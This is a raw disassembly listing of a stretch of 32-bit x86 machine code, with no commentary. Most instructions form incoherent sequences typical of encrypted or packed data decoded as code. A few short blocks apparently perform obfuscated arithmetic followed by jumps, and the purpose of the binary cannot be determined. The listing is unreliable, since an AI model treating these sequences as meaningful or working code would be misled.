  40e9d7:	add    dl,al
  40e9d9:	sbb    DWORD PTR [edi+0x57],ebx
  40e9dc:	sbb    eax,0xee188d10
  40e9e1:	xor    ebp,edx
  40e9e3:	jb     0x40ea2c
  40e9e5:	xor    ebp,ecx
  40e9e7:	idiv   BYTE PTR [ebx-0x1d54928d]
  40e9ed:	aad    0x9f
  40e9ef:	pop    esi
  40e9f0:	xchg   ecx,eax
  40e9f1:	fild   DWORD PTR ds:0x5e07d412
  40e9f7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e9f8:	in     al,dx
  40e9f9:	add    edi,DWORD PTR [edx+0xf]
  40e9fc:	xor    ebx,DWORD PTR [edx+0x3099807c]
  40ea02:	cmc    
  40ea03:	cmc    
  40ea04:	or     eax,0x380516b
  40ea09:	lds    ebp,FWORD PTR [ecx+ecx*2]
  40ea0c:	mov    esp,ebp
  40ea0e:	jmp    0x79bfeeec
  40ea13:	mov    eax,ds:0x8cece253
  40ea18:	mov    ch,BYTE PTR [ecx+0x12]
  40ea1b:	push   ebx
  40ea1c:	mov    ah,0x47
  40ea1e:	pop    ecx
  40ea1f:	jl     0x40ea8a
  40ea21:	or     ah,ah
  40ea23:	mov    esp,0xd0150f18
  40ea28:	ss and eax,0xc53f8d15
  40ea2e:	out    0x47,al
  40ea30:	mov    ds:0xb94b4bcc,al
  40ea35:	cmp    DWORD PTR [ecx+0x10bd3a73],esp
  40ea3b:	jg     0x40ea72
  40ea3d:	popf   
  40ea3e:	addr16 out dx,al
  40ea40:	pop    ss
  40ea41:	jne    0x40ea6f
  40ea43:	add    ebx,esi
  40ea45:	js     0x40ea50
  40ea47:	ret    0x9f94
  40ea4a:	test   BYTE PTR [ecx],0xab
  40ea4d:	adc    eax,0x51cb070e
  40ea52:	dec    ebx
  40ea53:	ss mov ebp,0x9ce352da
  40ea59:	pop    DWORD PTR [ebx-0x256e4a1d]
  40ea5f:	jb     0x40ea89
  40ea61:	out    0x15,al
  40ea63:	inc    ebp
  40ea64:	outs   dx,BYTE PTR ds:[esi]
  40ea65:	mov    dl,0x23
  40ea67:	pop    ebx
  40ea68:	sahf   
  40ea69:	or     DWORD PTR [ebp+0x50e85d2c],ebx
  40ea6f:	adc    eax,0x279b57cf
  40ea74:	mov    edi,0xaa11d0f4
  40ea79:	mov    esp,0x63a9b41d
  40ea7e:	iret   
  40ea7f:	bound  esi,QWORD PTR [edx+0x355f2405]
  40ea85:	jecxz  0x40eac7
  40ea87:	xlat   BYTE PTR ds:[ebx]
  40ea88:	sahf   
  40ea89:	adc    dl,BYTE PTR [ebx]
  40ea8b:	xchg   ebx,eax
  40ea8c:	cmp    esi,ecx
  40ea8e:	push   edx
  40ea8f:	dec    esi
  40ea90:	ins    BYTE PTR es:[edi],dx
  40ea91:	cmp    al,0xc4
  40ea93:	sar    esp,0x93
  40ea96:	sbb    al,0x61
  40ea98:	push   es
  40ea99:	sub    DWORD PTR [ecx-0x7ff604ca],edi
  40ea9f:	test   bl,al
  40eaa1:	shl    DWORD PTR [ebx],1
  40eaa3:	shl    bh,cl
  40eaa5:	test   DWORD PTR [ebx+0x4225b815],0xd4928b00
  40eaaf:	add    DWORD PTR [eax],eax
  40eab1:	add    BYTE PTR [ebx],ch
  40eab3:	ror    BYTE PTR [ebx+0x48a1045],1
  40eab9:	push   es
  40eaba:	mov    BYTE PTR [edx+ecx*1-0x1c12],al
  40eac1:	mov    eax,DWORD PTR [ebp-0x1c]
  40eac4:	mov    edx,DWORD PTR [ebp-0x18]
  40eac7:	imul   eax,edx
  40eaca:	mov    edx,DWORD PTR [ebp-0x14]
  40eacd:	imul   eax,eax,0x262b
  40ead3:	or     eax,edx
  40ead5:	mov    edx,DWORD PTR [ebp-0x10]
  40ead8:	or     eax,edx
  40eada:	xor    eax,0x59f6
  40eadf:	jmp    0x40eda3
  40eae4:	sub    BYTE PTR [edi-0x3c],0x71
  40eae8:	pushf  
  40eae9:	sbb    bl,BYTE PTR [edx]
  40eaeb:	pop    edx
  40eaec:	mov    ebp,0x70aa14b9
  40eaf1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40eaf2:	and    DWORD PTR [esi-0x3],edi
  40eaf5:	mov    eax,0x14d21818
  40eafa:	sbb    BYTE PTR [eax],bl
  40eafc:	push   ds
  40eafd:	das    
  40eafe:	xor    bh,dh
  40eb00:	loope  0x40eafc
  40eb02:	jp     0x40ea9b
  40eb04:	xor    eax,0xa5c12bea
  40eb09:	cmc    
  40eb0a:	inc    edx
  40eb0b:	mov    cl,0x16
  40eb0d:	dec    esi
  40eb0e:	add    eax,0x24f04483
  40eb13:	pop    esp
  40eb14:	add    bh,BYTE PTR [edi]
  40eb16:	dec    edx
  40eb17:	hlt    
  40eb18:	repz add DWORD PTR [ebx+0x53f8d1fd],0xffffffa3
  40eb20:	inc    ecx
  40eb21:	mov    ah,0x86
  40eb23:	clc    
  40eb24:	push   DWORD PTR [ebx-0x146752bb]
  40eb2a:	test   bl,0xe3
  40eb2d:	jl     0x40eb95
  40eb2f:	mov    bh,0x4
  40eb31:	lea    ebx,[ecx+eiz*8]
  40eb34:	popf   
  40eb35:	mov    bl,0x52
  40eb37:	mov    DWORD PTR [eax-0x6e17aa21],edx
  40eb3d:	sbb    al,0xf
  40eb3f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40eb40:	out    dx,al
  40eb41:	rcl    DWORD PTR [ebx+0xc],0xfb
  40eb45:	into   
  40eb46:	sub    eax,0x2651d0f5
  40eb4b:	test   dl,ch
  40eb4d:	pop    ebp
  40eb4e:	push   ds
  40eb4f:	jnp    0x40eb16
  40eb51:	sub    bh,BYTE PTR [edx-0x1fa82ec]
  40eb57:	push   eax
  40eb58:	pusha  
  40eb59:	outs   dx,DWORD PTR ds:[esi]
  40eb5a:	fadd   DWORD PTR [ebx]
  40eb5c:	xchg   BYTE PTR [edx-0x7e],dl
  40eb5f:	imul   edi,edx,0xdd8d754c
  40eb65:	inc    edx
  40eb66:	dec    esi
  40eb67:	fcmovb st,st(4)
  40eb69:	gs inc ebp
  40eb6b:	push   0xe2a2f40
  40eb70:	mov    dl,0xe
  40eb72:	loop   0x40eb52
  40eb74:	pop    ds
  40eb75:	test   bl,ah
  40eb77:	popf   
  40eb78:	jl     0x40eb5a
  40eb7a:	das    
  40eb7b:	movups xmm0,XMMWORD PTR [ebp+0x68]
  40eb7f:	xchg   edi,eax
  40eb80:	test   eax,0xfda5f43c
  40eb85:	lds    eax,FWORD PTR [eax]
  40eb87:	cwde   
  40eb88:	push   0xa811dfdf
  40eb8d:	sbb    ah,BYTE PTR [esi+edx*4+0x4cbe2774]
  40eb94:	dec    edx
  40eb95:	int    0x37
  40eb97:	jns    0x40ebbf
  40eb99:	pop    ecx
  40eb9a:	imul   ebp,DWORD PTR [esi-0x392f8546],0xffffff96
  40eba1:	sbb    eax,0xf0125078
  40eba6:	and    eax,0xad7a1ab0
  40ebab:	addr16 int 0x9d
  40ebae:	ins    DWORD PTR es:[edi],dx
  40ebaf:	xchg   cl,dl
  40ebb1:	test   al,0x32
  40ebb3:	xlat   BYTE PTR ds:[ebx]
  40ebb4:	dec    esp
  40ebb5:	ss or  al,0x1d
  40ebb8:	shl    DWORD PTR [ebp-0x4],cl
  40ebbb:	das    
  40ebbc:	jo     0x40eb4d
  40ebbe:	(bad)  
  40ebbf:	jbe    0x40eb75
  40ebc1:	sub    eax,0xa056987b
  40ebc6:	addr16 pop es
  40ebc8:	cmc    
  40ebc9:	push   edi
  40ebca:	push   edi
  40ebcb:	fninit 
  40ebcd:	push   cs
  40ebce:	mov    edi,0x7a5b585e
  40ebd3:	xor    ebx,DWORD PTR [ecx]
  40ebd5:	dec    edx
  40ebd6:	loope  0x40eb9e
  40ebd8:	icebp  
  40ebd9:	popf   
  40ebda:	in     al,dx
  40ebdb:	jp     0x40ec5c
  40ebdd:	mov    ecx,0x4c6f9d89
  40ebe2:	in     al,dx
  40ebe3:	mov    DWORD PTR [esi+0x33],ecx
  40ebe6:	cmp    BYTE PTR [edi],al
  40ebe8:	or     al,0xd9
  40ebea:	xchg   ebx,eax
  40ebeb:	adc    ebx,ebx
  40ebed:	xchg   edx,eax
  40ebee:	xor    eax,0x28111ce2
  40ebf3:	jmp    0x40ebb8
  40ebf5:	push   esp
  40ebf6:	into   
  40ebf7:	repnz jecxz 0x40ebeb
  40ebfa:	mov    dl,0x16
  40ebfc:	clc    
  40ebfd:	je     0x40ec02
  40ebff:	cwde   
  40ec00:	xchg   esi,eax
  40ec01:	stc    
  40ec02:	and    al,0xc0
  40ec04:	jmp    0xfcafbd37
  40ec09:	inc    edx
  40ec0b:	xchg   ebx,eax
  40ec0c:	repz fisttp QWORD PTR [ebx-0x76]
  40ec10:	fs call 0xc3b5:0x3e723ef1
  40ec18:	jge    0x40ebaf
  40ec1a:	test   BYTE PTR [edx+0x33],0x44
  40ec1e:	inc    esp
  40ec1f:	xchg   ecx,eax
  40ec20:	jne    0x40ebf0
  40ec22:	fstp   TBYTE PTR [esi+0x570a3524]
  40ec28:	lock pop ds
  40ec2a:	fcmovnu st,st(2)
  40ec2c:	lea    ecx,[edx+0x27]
  40ec2f:	fidiv  WORD PTR [ecx]
  40ec31:	repnz das 
  40ec33:	xor    eax,0x377aa2b
  40ec38:	lahf   
  40ec39:	cmc    
  40ec3a:	mov    ebx,0x91b9b3e9
  40ec3f:	jbe    0x40ebdd
  40ec41:	outs   dx,BYTE PTR ds:[esi]
  40ec42:	leave  
  40ec43:	xchg   DWORD PTR [eax],edx
  40ec45:	aaa    
  40ec46:	rcl    BYTE PTR [eax],1
  40ec48:	aaa    
  40ec49:	lea    ecx,[ebx]
  40ec4b:	retf   0xf8af
  40ec4e:	sbb    ch,bl
  40ec50:	xlat   BYTE PTR ds:[ebx]
  40ec51:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ec52:	or     DWORD PTR [eax-0x4676b580],esi
  40ec58:	inc    edx
  40ec59:	sbb    ebp,0xfffffff6
  40ec5c:	fbld   TBYTE PTR [edi+0x3f]
  40ec5f:	cmove  esp,DWORD PTR [edi+eax*8]
  40ec63:	fwait
  40ec64:	scas   al,BYTE PTR es:[edi]
  40ec65:	cmp    ebp,DWORD PTR [edx-0x1f]
  40ec68:	call   0x8397:0xa158cc13
  40ec6f:	pop    sp
  40ec71:	sub    edx,DWORD PTR [eax]
  40ec73:	or     BYTE PTR [ebp-0x3615544b],al
  40ec79:	jae    0x40ec8a
  40ec7b:	inc    eax
  40ec7c:	outs   dx,DWORD PTR ds:[esi]
  40ec7d:	sahf   
  40ec7e:	mov    WORD PTR [esi],ds
  40ec80:	out    dx,eax
  40ec81:	sub    al,dl
  40ec83:	cld    
  40ec84:	add    DWORD PTR ds:0x5ee56659,0xffffffbe
  40ec8b:	scas   al,BYTE PTR es:[edi]
  40ec8c:	ret    0xffe6
  40ec8f:	mov    bl,0x34
  40ec91:	ja     0x40ecfd
  40ec93:	mov    ecx,0x3f83c863
  40ec98:	js     0x40ec98
  40ec9a:	enter  0xb0c8,0x1e
  40ec9e:	lods   eax,DWORD PTR ds:[esi]
  40ec9f:	outs   dx,DWORD PTR ds:[esi]
  40eca0:	gs dec ecx
  40eca2:	gs inc eax
  40eca4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40eca5:	fwait
  40eca6:	jno    0x40ec67
  40eca8:	xor    eax,eax
  40ecaa:	call   0x7a0423c7
  40ecaf:	mov    ebx,0xba82b3f8
  40ecb4:	jp     0x40ec52
  40ecb6:	inc    edx
  40ecb7:	mov    DWORD PTR [ecx-0x4ac3dcda],edi
  40ecbd:	cwde   
  40ecbe:	test   DWORD PTR [ebx+esi*8],edi
  40ecc1:	in     eax,dx
  40ecc2:	push   cs
  40ecc3:	ret    0x7a5f
  40ecc6:	mov    WORD PTR [ecx+0x42],?
  40ecc9:	aas    
  40ecca:	push   ss
  40eccb:	xor    ch,dh
  40eccd:	push   ecx
  40ecce:	aas    
  40eccf:	into   
  40ecd0:	rcr    cl,1
  40ecd2:	push   edi
  40ecd3:	inc    ecx
  40ecd4:	sub    dh,dh
  40ecd6:	pusha  
  40ecd7:	add    eax,0xb0930877
  40ecdc:	aad    0x26
  40ecde:	adc    eax,DWORD PTR es:[edx+0x52]
  40ece2:	mov    esi,0x47d3d9ab
  40ece7:	and    al,0x6f
  40ece9:	and    al,0xbf
  40eceb:	jae    0x40ed4f
  40eced:	inc    ecx
  40ecee:	push   es
  40ecef:	push   eax
  40ecf0:	inc    esp
  40ecf1:	mov    al,ds:0xf214e00d
  40ecf6:	loopne 0x40ed54
  40ecf8:	retf   0xa7e9
  40ecfb:	aad    0x3
  40ecfd:	stc    
  40ecfe:	repnz aaa 
  40ed00:	inc    eax
  40ed01:	and    bl,BYTE PTR [ecx-0x53d5053b]
  40ed07:	hlt    
  40ed08:	int    0x70
  40ed0a:	addr16 and esp,eax
  40ed0d:	pop    ebx
  40ed0f:	mov    al,0x9f
  40ed11:	ins    DWORD PTR es:[edi],dx
  40ed12:	ds cmp ch,cl
  40ed15:	dec    eax
  40ed16:	sub    BYTE PTR [edx-0x63e556ee],bl
  40ed1c:	hlt    
  40ed1d:	and    dl,ah
  40ed1f:	clc    
  40ed20:	mov    al,ds:0xcdff2386
  40ed25:	sub    dh,bh
  40ed27:	cmp    cl,BYTE PTR [esi]
  40ed29:	pop    edi
  40ed2a:	int3   
  40ed2b:	fild   QWORD PTR [esi]
  40ed2d:	push   es
  40ed2e:	pop    ecx
  40ed2f:	cmp    al,0x19
  40ed31:	mov    ecx,es
  40ed33:	adc    al,0xc2
  40ed35:	imul   DWORD PTR [edx-0x7]
  40ed38:	inc    esi
  40ed39:	in     eax,0xc
  40ed3b:	jae    0x40ece8
  40ed3d:	cmp    dl,BYTE PTR [ebx-0x3584ac0e]
  40ed43:	xor    al,0x1d
  40ed45:	xchg   esp,eax
  40ed46:	cld    
  40ed47:	repnz loop 0x40ecfe
  40ed4a:	xchg   ebx,eax
  40ed4b:	std    
  40ed4c:	dec    esi
  40ed4d:	and    ah,0xfb
  40ed50:	sub    DWORD PTR [esi+0x7d],esi
  40ed53:	ror    BYTE PTR [edx-0x4d],cl
  40ed56:	js     0x40ed04
  40ed58:	sbb    al,0xee
  40ed5b:	jne    0x40eceb
  40ed5d:	xor    eax,esi
  40ed5f:	jle    0x40eda9
  40ed61:	push   eax
  40ed62:	push   ebx
  40ed63:	leave  
  40ed64:	sub    ah,dl
  40ed66:	mov    DWORD PTR [ebx+ebp*1+0x3092da85],edx
  40ed6d:	(bad)  
  40ed6e:	popf   
  40ed6f:	dec    ecx
  40ed70:	push   edx
  40ed71:	pop    eax
  40ed72:	lea    edi,[edx]
  40ed74:	mov    ch,0xdd
  40ed76:	fst    QWORD PTR [edx]
  40ed78:	into   
  40ed79:	mov    BYTE PTR [esi-0x2315d0b8],ch
  40ed7f:	jle    0x40ed82
  40ed81:	push   edi
  40ed82:	inc    eax
  40ed83:	das    
  40ed84:	repz (bad) 
  40ed86:	and    esp,eax
  40ed88:	xor    DWORD PTR [edx+0x19],edi
  40ed8b:	shr    DWORD PTR [edx+edx*2+0x5a34d43c],0xa8
  40ed93:	jbe    0x40ed6f
  40ed95:	sahf   
  40ed96:	call   0xf056f98f
  40ed9b:	sbb    eax,0x29aab93a
  40eda0:	pusha  
  40eda1:	xchg   ebp,eax
  40eda2:	pop    edx
  40eda3:	lea    ecx,[ecx+eax*1+0x350559e6]
  40edaa:	mov    eax,DWORD PTR [ebp-0xc]
  40edad:	and    eax,0xddc
  40edb2:	add    eax,DWORD PTR [ebp-0x8]
  40edb5:	xor    eax,0x46e3
  40edba:	add    eax,0x50eb
  40edbf:	cmp    ecx,eax
  40edc1:	jmp    0x40f085
  40edc6:	cmp    DWORD PTR [edx-0x25e5f4a4],ecx
  40edcc:	daa    
  40edcd:	sub    ch,BYTE PTR [edx+0x12aa1270]
  40edd3:	mov    eax,ds:0xb2b76a33
  40edd8:	sbb    BYTE PTR [eax],bl
  40edda:	rcl    BYTE PTR [eax+ebx*1],cl
  40eddd:	sbb    dh,dl
  40eddf:	cmp    eax,0x60f62684
  40ede4:	pusha  
  40ede5:	mov    ah,0x95
  40ede7:	cmp    edi,DWORD PTR [edx+eax*4-0x35c937fb]
  40edee:	sahf   
  40edef:	mov    cl,0xf0
  40edf1:	out    dx,eax
  40edf2:	hlt    
  40edf3:	out    dx,eax
  40edf4:	pop    edx
  40edf5:	in     al,0xa6
  40edf7:	or     ebp,DWORD PTR [eax-0x4fe67d81]
  40edfd:	and    eax,0xb2686905
  40ee02:	hlt    
  40ee03:	loope  0x40ee7c
  40ee05:	pop    edx
  40ee06:	add    al,0x81
  40ee08:	xchg   ebx,eax
  40ee09:	fisub  DWORD PTR [esp+esi*4+0x218c2b86]
  40ee10:	pop    edx
  40ee11:	inc    ebx
  40ee12:	pop    edx
  40ee13:	sub    al,0x2b
  40ee15:	fwait
  40ee16:	adc    ebx,DWORD PTR [edi+0xdbcc2ff]
  40ee1c:	add    al,0xc9
  40ee1e:	stos   BYTE PTR es:[edi],al
  40ee1f:	jno    0x40ee4e
  40ee21:	fbstp  TBYTE PTR [edx+ebp*2]
  40ee24:	or     DWORD PTR [esi],esp
  40ee26:	and    DWORD PTR [edx-0x1862640b],eax
  40ee2c:	es push ecx
  40ee2e:	popa   
  40ee2f:	call   0xfc9fe957
  40ee34:	cmp    esi,DWORD PTR [ebp+0x5fdfd62f]
  40ee3a:	js     0x40ee96
  40ee3c:	nop
  40ee3d:	mov    ah,0x61
  40ee3f:	lds    esp,FWORD PTR [edx-0xf24a745]
  40ee45:	mov    ecx,DWORD PTR [ebx+edi*4]
  40ee48:	das    
  40ee49:	cdq    
  40ee4a:	outs   dx,DWORD PTR ds:[esi]
  40ee4b:	test   eax,0xdf7632d0
  40ee50:	or     ch,bl
  40ee52:	sub    ecx,ecx
  40ee54:	in     eax,0xca
  40ee56:	clc    
  40ee57:	retf   
  40ee58:	stc    
  40ee59:	inc    edi
  40ee5a:	jl     0x40ee76
  40ee5c:	pop    ebx
  40ee5d:	lods   al,BYTE PTR ds:[esi]
  40ee5e:	mov    ds:0x1ee237fc,eax
  40ee63:	pop    esi
  40ee64:	xchg   ebp,eax
  40ee65:	dec    ecx
  40ee66:	(bad)  
  40ee67:	push   cs
  40ee68:	jecxz  0x40eeb8
  40ee6a:	popa   
  40ee6b:	std    
  40ee6c:	aam    0x0
  40ee6e:	cmp    edx,DWORD PTR ds:0x9b42b314
  40ee74:	cmp    eax,0xfdd1c23e
  40ee79:	mov    ebp,0x92e89e39
  40ee7e:	daa    
  40ee7f:	add    DWORD PTR [ebx-0x66103f05],ebp
  40ee85:	inc    ebx
  40ee86:	push   edx
  40ee87:	loop   0x40eebc
  40ee89:	pusha  
  40ee8a:	jp     0x40eef1
  40ee8c:	mov    ah,0xbd
  40ee8e:	mov    ds:0x9b36a498,al
  40ee93:	sub    eax,0xba045f66
  40ee98:	gs call 0x1e0e:0xc7b3883
  40eea0:	aad    0x9e
  40eea2:	sti    
  40eea3:	lds    ebp,FWORD PTR ds:0x432846f8
  40eea9:	shl    DWORD PTR [eax+0x4655e5d6],0x66
  40eeb0:	push   ss
  40eeb1:	stos   BYTE PTR es:[edi],al
  40eeb2:	(bad)  
  40eeb3:	adc    ch,BYTE PTR [eax+0x397f3559]
  40eeb9:	xchg   edi,eax
  40eeba:	scas   al,BYTE PTR es:[edi]
  40eebb:	pop    ecx
  40eebc:	pop    ebx
  40eebd:	or     BYTE PTR [ebx+0x5f55e8ad],0xda
  40eec4:	call   0x8a02:0xae4936ba
  40eecb:	cdq    
  40eecc:	dec    esp
  40eecd:	int    0x74
  40eecf:	hlt    
  40eed0:	push   edx
  40eed1:	inc    eax
  40eed2:	and    ecx,ebx
  40eed4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40eed5:	aas    
  40eed6:	xchg   esi,eax
  40eed7:	or     ax,0x3178
  40eedb:	in     eax,0x88
  40eedd:	push   0xfffffff3
  40eedf:	xchg   ecx,eax
  40eee0:	setae  cl
  40eee3:	shr    BYTE PTR [ebx],1
  40eee5:	aam    0x3
  40eee7:	in     al,0x1d
  40eee9:	cmp    esp,0xffffffae
  40eeec:	xchg   edi,eax
  40eeed:	and    eax,0xe5bb05c4
  40eef2:	mov    al,ds:0xeaad9c30
  40eef7:	fdiv   st,st(5)
  40eef9:	jne    0x40eef2
  40eefb:	pop    ebx
  40eefc:	jmp    0xf15a:0x138dfc84
  40ef03:	inc    esi
  40ef04:	shl    DWORD PTR [edx+0x50],0x63
  40ef08:	sar    DWORD PTR [edi+0x4d],cl
  40ef0b:	test   BYTE PTR cs:[ebx],dl
  40ef0e:	dec    ebx
  40ef0f:	fbstp  TBYTE PTR [esi+0x54]
  40ef12:	xchg   esp,eax
  40ef13:	xor    DWORD PTR [esp+ebx*4-0x1bd81fb2],esp
  40ef1a:	leave  
  40ef1b:	add    BYTE PTR [ebp-0xf],cl
  40ef1e:	retf   
  40ef1f:	popa   
  40ef20:	mov    esi,ebx
  40ef22:	sub    eax,0x4010e570
  40ef27:	shl    DWORD PTR [esi+eax*1+0x16],0x2e
  40ef2c:	lods   eax,DWORD PTR ds:[esi]
  40ef2d:	jb     0x40ef8f
  40ef2f:	add    al,0x38
  40ef31:	cvtps2pd xmm7,QWORD PTR [ebx]
  40ef34:	xlat   BYTE PTR ds:[ebx]
  40ef35:	mov    DWORD PTR [edx-0x286caef5],edi
  40ef3b:	das    
  40ef3c:	dec    ecx
  40ef3d:	xor    dh,BYTE PTR es:[ebx+ecx*4]
  40ef41:	mov    ebp,0x7cc57d80
  40ef46:	bound  ebx,QWORD PTR [edx]
  40ef48:	sar    BYTE PTR [ebx+eiz*1-0x286ed151],cl
  40ef4f:	sbb    al,0xc9
  40ef51:	rcr    DWORD PTR [ecx-0x6a],cl
  40ef54:	jge    0x40eef4
  40ef56:	dec    ebx
  40ef57:	push   ebx
  40ef58:	mov    es,WORD PTR [ebp-0x29b7693a]
  40ef5e:	out    dx,al
  40ef5f:	scas   eax,DWORD PTR es:[edi]
  40ef60:	xchg   ecx,edi
  40ef62:	fs lahf 
  40ef64:	rcr    BYTE PTR [edx+0x30],1
  40ef67:	into   
  40ef68:	mov    ds:0x9acfb006,eax
  40ef6d:	adc    al,0x91
  40ef6f:	dec    esi
  40ef70:	ror    DWORD PTR [esi],0xf6
  40ef73:	fs inc ebp
  40ef75:	xchg   bl,dl
  40ef77:	aaa    
  40ef78:	mov    ecx,0x81e001b4
  40ef7d:	xchg   esp,eax
  40ef7e:	aad    0xe9
  40ef80:	shl    dh,cl
  40ef82:	mov    dh,0x4d
  40ef84:	push   ebp
  40ef85:	aas    
  40ef86:	sbb    esp,DWORD PTR [ebx]
  40ef88:	loopne 0x40ef2b
  40ef8a:	inc    edx
  40ef8b:	popf   
  40ef8c:	es pop ebp
  40ef8e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ef8f:	fild   QWORD PTR [esi]
  40ef91:	loope  0x40efe2
  40ef93:	sbb    DWORD PTR ds:0xfbaab692,edi
  40ef99:	xor    edx,edx
  40ef9b:	outs   dx,DWORD PTR ds:[esi]
  40ef9c:	dec    ebx
  40ef9d:	push   esp
  40ef9e:	es dec eax
  40efa0:	jge    0x40f01f
  40efa2:	test   DWORD PTR [eax+0x6c],eax
  40efa5:	fisttp WORD PTR [esi-0x7f72fca9]
  40efab:	or     BYTE PTR [ecx*2-0x38b59226],al
  40efb2:	mov    ebp,0x83ae91dc
  40efb7:	inc    eax
  40efb8:	pop    ebx
  40efb9:	xor    cl,BYTE PTR [edi-0x1a]
  40efbc:	adc    ebx,eax
  40efbe:	and    DWORD PTR [edi+0x6498196a],edx
  40efc4:	cmp    eax,0x8b857b2
  40efc9:	pop    ds
  40efca:	lds    ebx,FWORD PTR [edx]
  40efcc:	pcmpeqw mm0,QWORD PTR [edi-0x6e]
  40efd0:	test   eax,0x696b3a27
  40efd5:	push   ecx
  40efd6:	add    al,0x2a
  40efd8:	(bad)  
  40efd9:	lea    esi,[edx+0x936468c]
  40efdf:	and    al,0xff
  40efe1:	add    eax,0x185dfb88
  40efe6:	mul    DWORD PTR [edi+0x210f8dab]
  40efec:	xor    bh,BYTE PTR [edi+0x2992a24a]
  40eff2:	rcl    esi,1
  40eff4:	add    esi,DWORD PTR [ecx-0x34e429f1]
  40effa:	es push edi
  40effc:	retf   0x1a24
  40efff:	jle    0x40f00e
  40f001:	into   
  40f002:	jg     0x40efc6
  40f004:	cmp    BYTE PTR [eax-0x2d],ch
  40f007:	mov    dh,0x3e
  40f009:	pushf  
  40f00a:	out    0x26,eax
  40f00c:	xchg   ecx,eax
  40f00d:	sbb    dh,0x13
  40f010:	fdivrp st(5),st
  40f012:	stc    
  40f013:	push   edi
  40f014:	push   cs
  40f015:	in     al,0x6
  40f017:	inc    ebp
  40f018:	das    
  40f019:	sbb    dl,ah
  40f01b:	cmp    BYTE PTR [edi-0xa1eb74f],bh
  40f021:	fs lahf 
  40f023:	xchg   ecx,eax
  40f024:	jno    0x40f016
  40f026:	add    al,BYTE PTR [edx-0x3977a693]
  40f02c:	dec    ecx
  40f02d:	pop    ds
  40f02e:	mov    dl,0x39
  40f030:	in     al,0xc9
  40f032:	stc    
  40f033:	fld    DWORD PTR [eax*1+0x27d1b9d4]
  40f03a:	and    ebx,DWORD PTR [ebx+0x33]
  40f03d:	fldcw  WORD PTR [ebp-0x66]
  40f040:	jns    0x40f0a8
  40f042:	cmp    DWORD PTR [esi+0x34b2c96],ecx
  40f048:	cli    
  40f049:	loope  0x40f008
  40f04b:	dec    esp
  40f04c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f04d:	adc    bh,BYTE PTR [edi-0x4863093c]
  40f053:	push   edi
  40f054:	xor    ecx,ebx
  40f056:	xchg   dh,ah
  40f058:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f059:	pop    esi
  40f05a:	test   BYTE PTR [esi-0x43],dh
  40f05d:	pop    esp
  40f05e:	or     eax,0xf06a697e
  40f063:	popa   
  40f064:	pop    edx
  40f065:	sub    ecx,DWORD PTR [ebp+0x57]
  40f068:	sub    BYTE PTR [esp-0x6],al
  40f06c:	mov    cl,0x62
  40f06e:	mov    si,0xc4ba
  40f072:	xor    eax,0x2633c267
  40f077:	clc    
  40f078:	cwde   
  40f079:	mov    edi,0xc319c66a
  40f07e:	loopne 0x40f096
  40f080:	nop
  40f081:	adc    cl,ah
  40f083:	in     eax,0x4
  40f085:	jne    0x40e793
  40f08b:	pop    edi
  40f08c:	jmp    0x40f350
  40f091:	inc    edi
  40f092:	mov    ds:0x305a70db,al
  40f097:	inc    edx
  40f098:	call   0xe5ee:0xaa146552
  40f09f:	jnp    0x40f051
  40f0a1:	jo     0x40f051
  40f0a3:	sbb    BYTE PTR [eax],bl
  40f0a5:	rcl    BYTE PTR [eax+ebx*1],cl
  40f0a8:	sbb    BYTE PTR [eax],ch
  40f0aa:	sub    al,0xa5
  40f0ac:	das    
  40f0ad:	into   
  40f0ae:	and    eax,0x4820c4d3
  40f0b3:	pop    es
  40f0b4:	pushf  
  40f0b5:	lds    edi,FWORD PTR [edi]
  40f0b7:	lea    esi,[edx-0x29450e79]
  40f0bd:	mov    ebx,0xe986ac41
  40f0c2:	sbb    al,0x9e
  40f0c4:	fcmovb st,st(4)
  40f0c6:	sbb    DWORD PTR fs:[esp+ebx*1-0x6c],ecx
  40f0cb:	lea    esp,ss:[edi+0x1e]
  40f0cf:	retf   0xd846
  40f0d2:	ins    DWORD PTR es:[edi],dx
  40f0d3:	fs jle 0x40f10b
  40f0d6:	inc    eax
  40f0d7:	pop    esi
  40f0d8:	(bad)  
  40f0d9:	mov    ebx,edx
  40f0db:	xor    al,0x86
  40f0dd:	add    ebp,DWORD PTR [edx+0x1c0950fb]
  40f0e3:	mov    edi,?
  40f0e5:	sbb    al,0x11
  40f0e7:	mov    bl,0x3e
  40f0e9:	adc    DWORD PTR [edx+0x4f638650],ebx
  40f0ef:	mov    dl,BYTE PTR [esi+eiz*4]
  40f0f2:	arpl   WORD PTR [eax+eax*8],ax
  40f0f5:	test   DWORD PTR [ebp-0x50],edi
  40f0f8:	push   esi
  40f0f9:	pushf  
  40f0fa:	lea    ebx,es:[esi+0x23689e55]
  40f101:	add    DWORD PTR [edi],ebx
  40f103:	pop    edx
  40f104:	adc    eax,0x955f6a99
  40f109:	xchg   edx,eax
  40f10a:	scas   al,BYTE PTR es:[edi]
  40f10b:	xor    ah,ch
  40f10d:	adc    eax,0x33f3475d
  40f112:	jmp    0xac2a752c
  40f117:	push   0xd7db1f10
  40f11c:	xor    DWORD PTR [ecx],0x34242086
  40f122:	cdq    
  40f123:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f124:	xchg   esi,eax
  40f125:	(bad)  
  40f126:	adc    cl,BYTE PTR [ebx-0xe]
  40f129:	cs popf 
  40f12b:	fsubr  QWORD PTR [ecx-0x37]
  40f12e:	retf   
  40f12f:	test   al,0x10
  40f131:	sub    eax,0x35c6080a
  40f136:	out    0xb6,eax
  40f138:	xchg   edx,eax
  40f139:	sbb    DWORD PTR [ebx+0x11be5436],eax
  40f13f:	mov    ecx,0x2428b5c5
  40f144:	out    dx,eax
  40f145:	(bad)  
  40f147:	jo     0x40f0e6
  40f149:	aam    0xe6
  40f14b:	sbb    eax,0xe40f2fb1
  40f150:	mov    edx,0x920ea52b
  40f155:	jae    0x40f1a9
  40f157:	je     0x40f14c
  40f159:	and    edx,DWORD PTR [ebx+edx*2]
  40f15c:	cmp    al,0x38
